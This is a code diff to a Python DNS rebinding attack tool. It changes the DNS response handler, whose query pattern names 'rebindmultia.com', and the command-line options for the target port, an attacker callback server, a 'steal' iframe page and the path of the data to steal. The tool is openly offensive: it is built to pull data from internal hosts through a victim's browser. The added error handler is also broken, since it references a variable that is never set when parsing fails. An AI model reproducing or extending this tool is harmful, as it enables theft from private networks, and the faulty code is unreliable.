@@ -90,7 +90,12 @@ class UDPRequestHandler(BaseRequestHandler):
 
 def dns_response(data):
     TTL = 600
-    request = DNSRecord.parse(data)
+    try:
+        request = DNSRecord.parse(data)
+    except dnslib.dns.DNSError:
+        #malformed dns request
+        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
+        return reply.pack()
     reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
     dn = str(request.q.qname).lower()
     m = re.match("(\d{0,3}.\d{0,3}.\d{0,3}.\d{0,3}).target.(\d{0,3}.\d{0,3}.\d{0,3}.\d{0,3}).ns.rebindmultia.com", dn)
@@ -140,10 +145,10 @@ def main(args):
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
-    parser.add_argument('-p', '--port', help="Specify port to attack on targetIp.", default=80)
-    parser.add_argument('-c', '--callback-port', help="Specify the callback HTTP server port.", default=31337)
-    parser.add_argument('-d', '--dns-port', help="Specify the DNS server port.", default=53)
-    parser.add_argument('-f', '--file', help="Specify the HTML file to display in the first iframe.(The \"steal\" iframe)", default="steal.html")
-    parser.add_argument('-l', '--location', help="Specify the location of the data you'd like to steal on the target.", default="/")
+    parser.add_argument('-p', '--port', help="Specify port to attack on targetIp. Default: 80", default=80)
+    parser.add_argument('-c', '--callback-port', help="Specify the callback HTTP server port. Default: 31337", default=31337)
+    parser.add_argument('-d', '--dns-port', help="Specify the DNS server port. Default: 53", default=53)
+    parser.add_argument('-f', '--file', help="Specify the HTML file to display in the first iframe.(The \"steal\" iframe). Default: steal.html", default="steal.html")
+    parser.add_argument('-l', '--location', help="Specify the location of the data you'd like to steal on the target. Default: /", default="/")
     args = parser.parse_args()
     main(args)
